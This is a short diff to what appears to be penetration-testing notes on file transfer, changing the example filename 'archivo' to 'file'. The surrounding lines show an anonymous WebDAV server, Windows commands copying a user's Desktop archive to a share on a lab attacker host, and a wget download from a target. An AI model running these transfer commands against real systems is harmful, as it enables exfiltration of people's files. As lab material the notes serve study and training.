@@ -147,8 +147,8 @@ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```cmd
 :: Windows: connect and upload
 dir \\10.10.14.1\DavWWWRoot
-copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\DavWWWRoot\
-copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\sharefolder\
+copy C:\Users\john\Desktop\file.zip \\10.10.14.1\DavWWWRoot\
+copy C:\Users\john\Desktop\file.zip \\10.10.14.1\sharefolder\
 ```
 
 ### FTP Upload
@@ -267,7 +267,7 @@ php -S 0.0.0.0:8000
 ruby -run -ehttpd . -p8000
 
 # Pwnbox: download the file
-wget http://<TARGET_IP>:8000/archivo.txt
+wget http://<TARGET_IP>:8000/file.txt
 ```
 
 ### SCP Upload
